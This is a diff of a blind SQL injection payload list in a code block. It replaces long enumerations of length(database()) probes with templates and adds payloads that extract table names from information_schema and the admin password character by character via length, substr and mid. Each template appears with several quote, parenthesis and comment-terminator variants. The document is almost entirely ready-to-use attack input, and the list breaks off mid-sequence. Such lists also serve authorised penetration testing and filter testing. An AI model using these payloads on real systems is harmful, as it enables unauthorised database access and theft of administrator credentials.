@@ -1,722 +1,434 @@
 ```sql
 ' or length(database())=1--'
-' or length(database())=2--'
-' or length(database())=3--'
-' or length(database())=4--'
-' or length(database())=5--'
-' or length(database())=6--'
-' or length(database())=7--'
-' or length(database())=8--'
-' or length(database())=9--'
-' or length(database())=10--'
-' or length(database())=11--'
-' or length(database())=12--'
-' or length(database())=13--'
-' or length(database())=14--'
-' or length(database())=15--'
-' or length(database())=16--'
-' or length(database())=17--'
-' or length(database())=18--'
-' or length(database())=19--'
-' or length(database())=20--'
-') or length(database())=1--'
-') or length(database())=2--'
-') or length(database())=3--'
-') or length(database())=4--'
-') or length(database())=5--'
-') or length(database())=6--'
-') or length(database())=7--'
-') or length(database())=8--'
-') or length(database())=9--'
-') or length(database())=10--'
-') or length(database())=11--'
-') or length(database())=12--'
-') or length(database())=13--'
-') or length(database())=14--'
-') or length(database())=15--'
-') or length(database())=16--'
-') or length(database())=17--'
-') or length(database())=18--'
-') or length(database())=19--'
-') or length(database())=20--'
-')) or length(database())=1--'
-')) or length(database())=2--'
-')) or length(database())=3--'
-')) or length(database())=4--'
-')) or length(database())=5--'
-')) or length(database())=6--'
-')) or length(database())=7--'
-')) or length(database())=8--'
-')) or length(database())=9--'
-')) or length(database())=10--'
-')) or length(database())=11--'
-')) or length(database())=12--'
-')) or length(database())=13--'
-')) or length(database())=14--'
-')) or length(database())=15--'
-')) or length(database())=16--'
-')) or length(database())=17--'
-')) or length(database())=18--'
-')) or length(database())=19--'
-')) or length(database())=20--'
 ' or length(database())=1 #'
-' or length(database())=2 #'
-' or length(database())=3 #'
-' or length(database())=4 #'
-' or length(database())=5 #'
-' or length(database())=6 #'
-' or length(database())=7 #'
-' or length(database())=8 #'
-' or length(database())=9 #'
-' or length(database())=10 #'
-' or length(database())=11 #'
-' or length(database())=12 #'
-' or length(database())=13 #'
-' or length(database())=14 #'
-' or length(database())=15 #'
-' or length(database())=16 #'
-' or length(database())=17 #'
-' or length(database())=18 #'
-' or length(database())=19 #'
-' or length(database())=20 #'
-') or length(database())=1 #'
-') or length(database())=2 #'
-') or length(database())=3 #'
-') or length(database())=4 #'
-') or length(database())=5 #'
-') or length(database())=6 #'
-') or length(database())=7 #'
-') or length(database())=8 #'
-') or length(database())=9 #'
-') or length(database())=10 #'
-') or length(database())=11 #'
-') or length(database())=12 #'
-') or length(database())=13 #'
-') or length(database())=14 #'
-') or length(database())=15 #'
-') or length(database())=16 #'
-') or length(database())=17 #'
-') or length(database())=18 #'
-') or length(database())=19 #'
-') or length(database())=20 #'
-')) or length(database())=1 #'
-')) or length(database())=2 #'
-')) or length(database())=3 #'
-')) or length(database())=4 #'
-')) or length(database())=5 #'
-')) or length(database())=6 #'
-')) or length(database())=7 #'
-')) or length(database())=8 #'
-')) or length(database())=9 #'
-')) or length(database())=10 #'
-')) or length(database())=11 #'
-')) or length(database())=12 #'
-')) or length(database())=13 #'
-')) or length(database())=14 #'
-')) or length(database())=15 #'
-')) or length(database())=16 #'
-')) or length(database())=17 #'
-')) or length(database())=18 #'
-')) or length(database())=19 #'
-')) or length(database())=20 #'
 ' or length(database())=1 /-'
-' or length(database())=2 /-'
-' or length(database())=3 /-'
-' or length(database())=4 /-'
-' or length(database())=5 /-'
-' or length(database())=6 /-'
-' or length(database())=7 /-'
-' or length(database())=8 /-'
-' or length(database())=9 /-'
-' or length(database())=10 /-'
-' or length(database())=11 /-'
-' or length(database())=12 /-'
-' or length(database())=13 /-'
-' or length(database())=14 /-'
-' or length(database())=15 /-'
-' or length(database())=16 /-'
-' or length(database())=17 /-'
-' or length(database())=18 /-'
-' or length(database())=19 /-'
-' or length(database())=20 /-'
-') or length(database())=1 /-'
-') or length(database())=2 /-'
-') or length(database())=3 /-'
-') or length(database())=4 /-'
-') or length(database())=5 /-'
-') or length(database())=6 /-'
-') or length(database())=7 /-'
-') or length(database())=8 /-'
-') or length(database())=9 /-'
-') or length(database())=10 /-'
-') or length(database())=11 /-'
-') or length(database())=12 /-'
-') or length(database())=13 /-'
-') or length(database())=14 /-'
-') or length(database())=15 /-'
-') or length(database())=16 /-'
-') or length(database())=17 /-'
-') or length(database())=18 /-'
-') or length(database())=19 /-'
-') or length(database())=20 /-'
-')) or length(database())=1 /-'
-')) or length(database())=2 /-'
-')) or length(database())=3 /-'
-')) or length(database())=4 /-'
-')) or length(database())=5 /-'
-')) or length(database())=6 /-'
-')) or length(database())=7 /-'
-')) or length(database())=8 /-'
-')) or length(database())=9 /-'
-')) or length(database())=10 /-'
-')) or length(database())=11 /-'
-')) or length(database())=12 /-'
-')) or length(database())=13 /-'
-')) or length(database())=14 /-'
-')) or length(database())=15 /-'
-')) or length(database())=16 /-'
-')) or length(database())=17 /-'
-')) or length(database())=18 /-'
-')) or length(database())=19 /-'
-')) or length(database())=20 /-'
 ' or length(database())=1 /*'
-' or length(database())=2 /*'
-' or length(database())=3 /*'
-' or length(database())=4 /*'
-' or length(database())=5 /*'
-' or length(database())=6 /*'
-' or length(database())=7 /*'
-' or length(database())=8 /*'
-' or length(database())=9 /*'
-' or length(database())=10 /*'
-' or length(database())=11 /*'
-' or length(database())=12 /*'
-' or length(database())=13 /*'
-' or length(database())=14 /*'
-' or length(database())=15 /*'
-' or length(database())=16 /*'
-' or length(database())=17 /*'
-' or length(database())=18 /*'
-' or length(database())=19 /*'
-' or length(database())=20 /*'
-') or length(database())=1 /*'
-') or length(database())=2 /*'
-') or length(database())=3 /*'
-') or length(database())=4 /*'
-') or length(database())=5 /*'
-') or length(database())=6 /*'
-') or length(database())=7 /*'
-') or length(database())=8 /*'
-') or length(database())=9 /*'
-') or length(database())=10 /*'
-') or length(database())=11 /*'
-') or length(database())=12 /*'
-') or length(database())=13 /*'
-') or length(database())=14 /*'
-') or length(database())=15 /*'
-') or length(database())=16 /*'
-') or length(database())=17 /*'
-') or length(database())=18 /*'
-') or length(database())=19 /*'
-') or length(database())=20 /*'
-')) or length(database())=1 /*'
-')) or length(database())=2 /*'
-')) or length(database())=3 /*'
-')) or length(database())=4 /*'
-')) or length(database())=5 /*'
-')) or length(database())=6 /*'
-')) or length(database())=7 /*'
-')) or length(database())=8 /*'
-')) or length(database())=9 /*'
-')) or length(database())=10 /*'
-')) or length(database())=11 /*'
-')) or length(database())=12 /*'
-')) or length(database())=13 /*'
-')) or length(database())=14 /*'
-')) or length(database())=15 /*'
-')) or length(database())=16 /*'
-')) or length(database())=17 /*'
-')) or length(database())=18 /*'
-')) or length(database())=19 /*'
-')) or length(database())=20 /*'
 ' or length(database())=1 -+'
-' or length(database())=2 -+'
-' or length(database())=3 -+'
-' or length(database())=4 -+'
-' or length(database())=5 -+'
-' or length(database())=6 -+'
-' or length(database())=7 -+'
-' or length(database())=8 -+'
-' or length(database())=9 -+'
-' or length(database())=10 -+'
-' or length(database())=11 -+'
-' or length(database())=12 -+'
-' or length(database())=13 -+'
-' or length(database())=14 -+'
-' or length(database())=15 -+'
-' or length(database())=16 -+'
-' or length(database())=17 -+'
-' or length(database())=18 -+'
-' or length(database())=19 -+'
-' or length(database())=20 -+'
-') or length(database())=1 -+'
-') or length(database())=2 -+'
-') or length(database())=3 -+'
-') or length(database())=4 -+'
-') or length(database())=5 -+'
-') or length(database())=6 -+'
-') or length(database())=7 -+'
-') or length(database())=8 -+'
-') or length(database())=9 -+'
-') or length(database())=10 -+'
-') or length(database())=11 -+'
-') or length(database())=12 -+'
-') or length(database())=13 -+'
-') or length(database())=14 -+'
-') or length(database())=15 -+'
-') or length(database())=16 -+'
-') or length(database())=17 -+'
-') or length(database())=18 -+'
-') or length(database())=19 -+'
-') or length(database())=20 -+'
-')) or length(database())=1 -+'
-')) or length(database())=2 -+'
-')) or length(database())=3 -+'
-')) or length(database())=4 -+'
-')) or length(database())=5 -+'
-')) or length(database())=6 -+'
-')) or length(database())=7 -+'
-')) or length(database())=8 -+'
-')) or length(database())=9 -+'
-')) or length(database())=10 -+'
-')) or length(database())=11 -+'
-')) or length(database())=12 -+'
-')) or length(database())=13 -+'
-')) or length(database())=14 -+'
-')) or length(database())=15 -+'
-')) or length(database())=16 -+'
-')) or length(database())=17 -+'
-')) or length(database())=18 -+'
-')) or length(database())=19 -+'
-')) or length(database())=20 -+'
 ' or length(database())=1 *-'
-' or length(database())=2 *-'
-' or length(database())=3 *-'
-' or length(database())=4 *-'
-' or length(database())=5 *-'
-' or length(database())=6 *-'
-' or length(database())=7 *-'
-' or length(database())=8 *-'
-' or length(database())=9 *-'
-' or length(database())=10 *-'
-' or length(database())=11 *-'
-' or length(database())=12 *-'
-' or length(database())=13 *-'
-' or length(database())=14 *-'
-' or length(database())=15 *-'
-' or length(database())=16 *-'
-' or length(database())=17 *-'
-' or length(database())=18 *-'
-' or length(database())=19 *-'
-' or length(database())=20 *-'
+') or length(database())=1--'
+') or length(database())=1 #'
+') or length(database())=1 /-'
+') or length(database())=1 /*'
+') or length(database())=1 -+'
 ') or length(database())=1 *-'
-') or length(database())=2 *-'
-') or length(database())=3 *-'
-') or length(database())=4 *-'
-') or length(database())=5 *-'
-') or length(database())=6 *-'
-') or length(database())=7 *-'
-') or length(database())=8 *-'
-') or length(database())=9 *-'
-') or length(database())=10 *-'
-') or length(database())=11 *-'
-') or length(database())=12 *-'
-') or length(database())=13 *-'
-') or length(database())=14 *-'
-') or length(database())=15 *-'
-') or length(database())=16 *-'
-') or length(database())=17 *-'
-') or length(database())=18 *-'
-') or length(database())=19 *-'
-') or length(database())=20 *-'
+')) or length(database())=1--'
+')) or length(database())=1 #'
+')) or length(database())=1 /-'
+')) or length(database())=1 /*'
+')) or length(database())=1 -+'
 ')) or length(database())=1 *-'
-')) or length(database())=2 *-'
-')) or length(database())=3 *-'
-')) or length(database())=4 *-'
-')) or length(database())=5 *-'
-')) or length(database())=6 *-'
-')) or length(database())=7 *-'
-')) or length(database())=8 *-'
-')) or length(database())=9 *-'
-')) or length(database())=10 *-'
-')) or length(database())=11 *-'
-')) or length(database())=12 *-'
-')) or length(database())=13 *-'
-')) or length(database())=14 *-'
-')) or length(database())=15 *-'
-')) or length(database())=16 *-'
-')) or length(database())=17 *-'
-')) or length(database())=18 *-'
-')) or length(database())=19 *-'
-')) or length(database())=20 *-'
+' or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1--'
+' or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1 #'
+' or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1 /-'
+' or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1 /*'
+' or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1 -+'
+' or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1 *-'
+') or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1--'
+') or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1 #'
+') or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1 /-'
+') or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1 /*'
+') or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1 -+'
+') or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1 *-'
+')) or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1--'
+')) or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1 #'
+')) or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1 /-'
+')) or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1 /*'
+')) or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1 -+'
+')) or length((select table_name from information_schema.tables where table_schema='table name' limit 0,1))=1 *-'
+' or id='admin' and length(pw)=1--'
+' or id='admin' and length(pw)=1 #'
+' or id='admin' and length(pw)=1 /-'
+' or id='admin' and length(pw)=1 /*'
+' or id='admin' and length(pw)=1 -+'
+' or id='admin' and length(pw)=1 *-'
+') or id='admin' and length(pw)=1--'
+') or id='admin' and length(pw)=1 #'
+') or id='admin' and length(pw)=1 /-'
+') or id='admin' and length(pw)=1 /*'
+') or id='admin' and length(pw)=1 -+'
+') or id='admin' and length(pw)=1 *-'
+')) or id='admin' and length(pw)=1--'
+')) or id='admin' and length(pw)=1 #'
+')) or id='admin' and length(pw)=1 /-'
+')) or id='admin' and length(pw)=1 /*'
+')) or id='admin' and length(pw)=1 -+'
+')) or id='admin' and length(pw)=1 *-'
+admin' or length(pw)=1--'
+admin' or length(pw)=1 #'
+admin' or length(pw)=1 /-'
+admin' or length(pw)=1 /*'
+admin' or length(pw)=1 -+'
+admin' or length(pw)=1 *-'
+admin') or length(pw)=1--'
+admin') or length(pw)=1 #'
+admin') or length(pw)=1 /-'
+admin') or length(pw)=1 /*'
+admin') or length(pw)=1 -+'
+admin') or length(pw)=1 *-'
+admin')) or length(pw)=1--'
+admin')) or length(pw)=1 #'
+admin')) or length(pw)=1 /-'
+admin')) or length(pw)=1 /*'
+admin')) or length(pw)=1 -+'
+admin')) or length(pw)=1 *-'
+' or substr(database(),1,1)='a'--'
+' or substr(database(),1,1)='a' #'
+' or substr(database(),1,1)='a' /-'
+' or substr(database(),1,1)='a' /*'
+' or substr(database(),1,1)='a' -+'
+' or substr(database(),1,1)='a' *-'
+') or substr(database(),1,1)='a'--'
+') or substr(database(),1,1)='a' #'
+') or substr(database(),1,1)='a' /-'
+') or substr(database(),1,1)='a' /*'
+') or substr(database(),1,1)='a' -+'
+') or substr(database(),1,1)='a' *-'
+')) or substr(database(),1,1)='a'--'
+')) or substr(database(),1,1)='a' #'
+')) or substr(database(),1,1)='a' /-'
+')) or substr(database(),1,1)='a' /*'
+')) or substr(database(),1,1)='a' -+'
+')) or substr(database(),1,1)='a' *-'
+' or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a'--'
+' or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' #'
+' or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' /-'
+' or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' /*'
+' or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' -+'
+' or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' *-'
+') or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a'--'
+') or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' #'
+') or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' /-'
+') or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' /*'
+') or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' -+'
+') or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' *-'
+')) or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a'--'
+')) or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' #'
+')) or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' /-'
+')) or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' /*'
+')) or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' -+'
+')) or substr((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' *-'
+' or id='admin' and substr(pw,1,1)='a'--'
+' or id='admin' and substr(pw,1,1)='a' #'
+' or id='admin' and substr(pw,1,1)='a' /-'
+' or id='admin' and substr(pw,1,1)='a' /*'
+' or id='admin' and substr(pw,1,1)='a' -+'
+' or id='admin' and substr(pw,1,1)='a' *-'
+') or id='admin' and substr(pw,1,1)='a'--'
+') or id='admin' and substr(pw,1,1)='a' #'
+') or id='admin' and substr(pw,1,1)='a' /-'
+') or id='admin' and substr(pw,1,1)='a' /*'
+') or id='admin' and substr(pw,1,1)='a' -+'
+') or id='admin' and substr(pw,1,1)='a' *-'
+')) or id='admin' and substr(pw,1,1)='a'--'
+')) or id='admin' and substr(pw,1,1)='a' #'
+')) or id='admin' and substr(pw,1,1)='a' /-'
+')) or id='admin' and substr(pw,1,1)='a' /*'
+')) or id='admin' and substr(pw,1,1)='a' -+'
+')) or id='admin' and substr(pw,1,1)='a' *-'
+admin' or substr(pw,1,1)='a'--'
+admin' or substr(pw,1,1)='a' #'
+admin' or substr(pw,1,1)='a' /-'
+admin' or substr(pw,1,1)='a' /*'
+admin' or substr(pw,1,1)='a' -+'
+admin' or substr(pw,1,1)='a' *-'
+admin') or substr(pw,1,1)='a'--'
+admin') or substr(pw,1,1)='a' #'
+admin') or substr(pw,1,1)='a' /-'
+admin') or substr(pw,1,1)='a' /*'
+admin') or substr(pw,1,1)='a' -+'
+admin') or substr(pw,1,1)='a' *-'
+admin')) or substr(pw,1,1)='a'--'
+admin')) or substr(pw,1,1)='a' #'
+admin')) or substr(pw,1,1)='a' /-'
+admin')) or substr(pw,1,1)='a' /*'
+admin')) or substr(pw,1,1)='a' -+'
+admin')) or substr(pw,1,1)='a' *-'
+' or mid(database(),1,1)='a'--'
+' or mid(database(),1,1)='a' #'
+' or mid(database(),1,1)='a' /-'
+' or mid(database(),1,1)='a' /*'
+' or mid(database(),1,1)='a' -+'
+' or mid(database(),1,1)='a' *-'
+') or mid(database(),1,1)='a'--'
+') or mid(database(),1,1)='a' #'
+') or mid(database(),1,1)='a' /-'
+') or mid(database(),1,1)='a' /*'
+') or mid(database(),1,1)='a' -+'
+') or mid(database(),1,1)='a' *-'
+')) or mid(database(),1,1)='a'--'
+')) or mid(database(),1,1)='a' #'
+')) or mid(database(),1,1)='a' /-'
+')) or mid(database(),1,1)='a' /*'
+')) or mid(database(),1,1)='a' -+'
+')) or mid(database(),1,1)='a' *-'
+' or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a'--'
+' or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' #'
+' or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' /-'
+' or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' /*'
+' or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' -+'
+' or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' *-'
+') or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a'--'
+') or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' #'
+') or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' /-'
+') or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' /*'
+') or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' -+'
+') or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' *-'
+')) or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a'--'
+')) or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' #'
+')) or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' /-'
+')) or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' /*'
+')) or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' -+'
+')) or mid((select table_name from information_schema.tables where table_schema='table name' limit 0,1),1,1)='a' *-'
+' or id='admin' and mid(pw,1,1)='a'--'
+' or id='admin' and mid(pw,1,1)='a' #'
+' or id='admin' and mid(pw,1,1)='a' /-'
+' or id='admin' and mid(pw,1,1)='a' /*'
+' or id='admin' and mid(pw,1,1)='a' -+'
+' or id='admin' and mid(pw,1,1)='a' *-'
+') or id='admin' and mid(pw,1,1)='a'--'
+') or id='admin' and mid(pw,1,1)='a' #'
+') or id='admin' and mid(pw,1,1)='a' /-'
+') or id='admin' and mid(pw,1,1)='a' /*'
+') or id='admin' and mid(pw,1,1)='a' -+'
+') or id='admin' and mid(pw,1,1)='a' *-'
+')) or id='admin' and mid(pw,1,1)='a'--'
+')) or id='admin' and mid(pw,1,1)='a' #'
+')) or id='admin' and mid(pw,1,1)='a' /-'
+')) or id='admin' and mid(pw,1,1)='a' /*'
+')) or id='admin' and mid(pw,1,1)='a' -+'
+')) or id='admin' and mid(pw,1,1)='a' *-'
+admin' or mid(pw,1,1)='a'--'
+admin' or mid(pw,1,1)='a' #'
+admin' or mid(pw,1,1)='a' /-'
+admin' or mid(pw,1,1)='a' /*'
+admin' or mid(pw,1,1)='a' -+'
+admin' or mid(pw,1,1)='a' *-'
+admin') or mid(pw,1,1)='a'--'
+admin') or mid(pw,1,1)='a' #'
+admin') or mid(pw,1,1)='a' /-'
+admin') or mid(pw,1,1)='a' /*'
+admin') or mid(pw,1,1)='a' -+'
+admin') or mid(pw,1,1)='a' *-'
+admin')) or mid(pw,1,1)='a'--'
+admin')) or mid(pw,1,1)='a' #'
+admin')) or mid(pw,1,1)='a' /-'
+admin')) or mid(pw,1,1)='a' /*'
+admin')) or mid(pw,1,1)='a' -+'
+admin')) or mid(pw,1,1)='a' *-'
 " or length(database())=1--"
-" or length(database())=2--"
-" or length(database())=3--"
-" or length(database())=4--"
-" or length(database())=5--"
-" or length(database())=6--"
-" or length(database())=7--"
-" or length(database())=8--"
-" or length(database())=9--"
-" or length(database())=10--"
-" or length(database())=11--"
-" or length(database())=12--"
-" or length(database())=13--"
-" or length(database())=14--"
-" or length(database())=15--"
-" or length(database())=16--"
-" or length(database())=17--"
-" or length(database())=18--"
-" or length(database())=19--"
-" or length(database())=20--"
 " or length(database())=1 #"
-" or length(database())=2 #"
-" or length(database())=3 #"
-" or length(database())=4 #"
-" or length(database())=5 #"
-" or length(database())=6 #"
-" or length(database())=7 #"
-" or length(database())=8 #"
-" or length(database())=9 #"
-" or length(database())=10 #"
-" or length(database())=11 #"
-" or length(database())=12 #"
-" or length(database())=13 #"
-" or length(database())=14 #"
-" or length(database())=15 #"
-" or length(database())=16 #"
-" or length(database())=17 #"
-" or length(database())=18 #"
-" or length(database())=19 #"
-" or length(database())=20 #"
 " or length(database())=1 /-"
-" or length(database())=2 /-"
-" or length(database())=3 /-"
-" or length(database())=4 /-"
-" or length(database())=5 /-"
-" or length(database())=6 /-"
-" or length(database())=7 /-"
-" or length(database())=8 /-"
-" or length(database())=9 /-"
-" or length(database())=10 /-"
-" or length(database())=11 /-"
-" or length(database())=12 /-"
-" or length(database())=13 /-"
-" or length(database())=14 /-"
-" or length(database())=15 /-"
-" or length(database())=16 /-"
-" or length(database())=17 /-"
-" or length(database())=18 /-"
-" or length(database())=19 /-"
-" or length(database())=20 /-"
 " or length(database())=1 /*"
-" or length(database())=2 /*"
-" or length(database())=3 /*"
-" or length(database())=4 /*"
-" or length(database())=5 /*"
-" or length(database())=6 /*"
-" or length(database())=7 /*"
-" or length(database())=8 /*"
-" or length(database())=9 /*"
-" or length(database())=10 /*"
-" or length(database())=11 /*"
-" or length(database())=12 /*"
-" or length(database())=13 /*"
-" or length(database())=14 /*"
-" or length(database())=15 /*"
-" or length(database())=16 /*"
-" or length(database())=17 /*"
-" or length(database())=18 /*"
-" or length(database())=19 /*"
-" or length(database())=20 /*"
 " or length(database())=1 -+"
-" or length(database())=2 -+"
-" or length(database())=3 -+"
-" or length(database())=4 -+"
-" or length(database())=5 -+"
-" or length(database())=6 -+"
-" or length(database())=7 -+"
-" or length(database())=8 -+"
-" or length(database())=9 -+"
-" or length(database())=10 -+"
-" or length(database())=11 -+"
-" or length(database())=12 -+"
-" or length(database())=13 -+"
-" or length(database())=14 -+"
-" or length(database())=15 -+"
-" or length(database())=16 -+"
-" or length(database())=17 -+"
-" or length(database())=18 -+"
-" or length(database())=19 -+"
-" or length(database())=20 -+"
 " or length(database())=1 *-"
-" or length(database())=2 *-"
-" or length(database())=3 *-"
-" or length(database())=4 *-"
-" or length(database())=5 *-"
-" or length(database())=6 *-"
-" or length(database())=7 *-"
-" or length(database())=8 *-"
-" or length(database())=9 *-"
-" or length(database())=10 *-"
-" or length(database())=11 *-"
-" or length(database())=12 *-"
-" or length(database())=13 *-"
-" or length(database())=14 *-"
-" or length(database())=15 *-"
-" or length(database())=16 *-"
-" or length(database())=17 *-"
-" or length(database())=18 *-"
-" or length(database())=19 *-"
-" or length(database())=20 *-"
 ") or length(database())=1--"
-") or length(database())=2--"
-") or length(database())=3--"
-") or length(database())=4--"
-") or length(database())=5--"
-") or length(database())=6--"
-") or length(database())=7--"
-") or length(database())=8--"
-") or length(database())=9--"
-") or length(database())=10--"
-") or length(database())=11--"
-") or length(database())=12--"
-") or length(database())=13--"
-") or length(database())=14--"
-") or length(database())=15--"
-") or length(database())=16--"
-") or length(database())=17--"
-") or length(database())=18--"
-") or length(database())=19--"
-") or length(database())=20--"
 ") or length(database())=1 #"
-") or length(database())=2 #"
-") or length(database())=3 #"
-") or length(database())=4 #"
-") or length(database())=5 #"
-") or length(database())=6 #"
-") or length(database())=7 #"
-") or length(database())=8 #"
-") or length(database())=9 #"
-") or length(database())=10 #"
-") or length(database())=11 #"
-") or length(database())=12 #"
-") or length(database())=13 #"
-") or length(database())=14 #"
-") or length(database())=15 #"
-") or length(database())=16 #"
-") or length(database())=17 #"
-") or length(database())=18 #"
-") or length(database())=19 #"
-") or length(database())=20 #"
 ") or length(database())=1 /-"
-") or length(database())=2 /-"
-") or length(database())=3 /-"
-") or length(database())=4 /-"
-") or length(database())=5 /-"
-") or length(database())=6 /-"
-") or length(database())=7 /-"
-") or length(database())=8 /-"
-") or length(database())=9 /-"
-") or length(database())=10 /-"
-") or length(database())=11 /-"
-") or length(database())=12 /-"
-") or length(database())=13 /-"
-") or length(database())=14 /-"
-") or length(database())=15 /-"
-") or length(database())=16 /-"
-") or length(database())=17 /-"
-") or length(database())=18 /-"
-") or length(database())=19 /-"
-") or length(database())=20 /-"
 ") or length(database())=1 /*"
-") or length(database())=2 /*"
-") or length(database())=3 /*"
-") or length(database())=4 /*"
-") or length(database())=5 /*"
-") or length(database())=6 /*"
-") or length(database())=7 /*"
-") or length(database())=8 /*"
-") or length(database())=9 /*"
-") or length(database())=10 /*"
-") or length(database())=11 /*"
-") or length(database())=12 /*"
-") or length(database())=13 /*"
-") or length(database())=14 /*"
-") or length(database())=15 /*"
-") or length(database())=16 /*"
-") or length(database())=17 /*"
-") or length(database())=18 /*"
-") or length(database())=19 /*"
-") or length(database())=20 /*"
 ") or length(database())=1 -+"
-") or length(database())=2 -+"
-") or length(database())=3 -+"
-") or length(database())=4 -+"
-") or length(database())=5 -+"
-") or length(database())=6 -+"
-") or length(database())=7 -+"
-") or length(database())=8 -+"
-") or length(database())=9 -+"
-") or length(database())=10 -+"
-") or length(database())=11 -+"
-") or length(database())=12 -+"
-") or length(database())=13 -+"
-") or length(database())=14 -+"
-") or length(database())=15 -+"
-") or length(database())=16 -+"
-") or length(database())=17 -+"
-") or length(database())=18 -+"
-") or length(database())=19 -+"
-") or length(database())=20 -+"
 ") or length(database())=1 *-"
-") or length(database())=2 *-"
-") or length(database())=3 *-"
-") or length(database())=4 *-"
-") or length(database())=5 *-"
-") or length(database())=6 *-"
-") or length(database())=7 *-"
-") or length(database())=8 *-"
-") or length(database())=9 *-"
-") or length(database())=10 *-"
-") or length(database())=11 *-"
-") or length(database())=12 *-"
-") or length(database())=13 *-"
-") or length(database())=14 *-"
-") or length(database())=15 *-"
-") or length(database())=16 *-"
-") or length(database())=17 *-"
-") or length(database())=18 *-"
-") or length(database())=19 *-"
-") or length(database())=20 *-"
 ")) or length(database())=1--"
-")) or length(database())=2--"
-")) or length(database())=3--"
-")) or length(database())=4--"
-")) or length(database())=5--"
-")) or length(database())=6--"
-")) or length(database())=7--"
-")) or length(database())=8--"
-")) or length(database())=9--"
-")) or length(database())=10--"
-")) or length(database())=11--"
-")) or length(database())=12--"
-")) or length(database())=13--"
-")) or length(database())=14--"
-")) or length(database())=15--"
-")) or length(database())=16--"
-")) or length(database())=17--"
-")) or length(database())=18--"
-")) or length(database())=19--"
-")) or length(database())=20--"
 ")) or length(database())=1 #"
-")) or length(database())=2 #"
-")) or length(database())=3 #"
-")) or length(database())=4 #"
-")) or length(database())=5 #"
-")) or length(database())=6 #"
-")) or length(database())=7 #"
-")) or length(database())=8 #"
-")) or length(database())=9 #"
-")) or length(database())=10 #"
-")) or length(database())=11 #"
-")) or length(database())=12 #"
-")) or length(database())=13 #"
-")) or length(database())=14 #"
-")) or length(database())=15 #"
-")) or length(database())=16 #"
-")) or length(database())=17 #"
-")) or length(database())=18 #"
-")) or length(database())=19 #"
-")) or length(database())=20 #"
 ")) or length(database())=1 /-"
-")) or length(database())=2 /-"
-")) or length(database())=3 /-"
-")) or length(database())=4 /-"
-")) or length(database())=5 /-"
-")) or length(database())=6 /-"
-")) or length(database())=7 /-"
-")) or length(database())=8 /-"
-")) or length(database())=9 /-"
-")) or length(database())=10 /-"
-")) or length(database())=11 /-"
-")) or length(database())=12 /-"
-")) or length(database())=13 /-"
-")) or length(database())=14 /-"
-")) or length(database())=15 /-"
-")) or length(database())=16 /-"
-")) or length(database())=17 /-"
-")) or length(database())=18 /-"
-")) or length(database())=19 /-"
-")) or length(database())=20 /-"
 ")) or length(database())=1 /*"
-")) or length(database())=2 /*"
-")) or length(database())=3 /*"
-")) or length(database())=4 /*"
-")) or length(database())=5 /*"
-")) or length(database())=6 /*"
-")) or length(database())=7 /*"
-")) or length(database())=8 /*"
-")) or length(database())=9 /*"
-")) or length(database())=10 /*"
-")) or length(database())=11 /*"
-")) or length(database())=12 /*"
-")) or length(database())=13 /*"
-")) or length(database())=14 /*"
-")) or length(database())=15 /*"
-")) or length(database())=16 /*"
-")) or length(database())=17 /*"
-")) or length(database())=18 /*"
-")) or length(database())=19 /*"
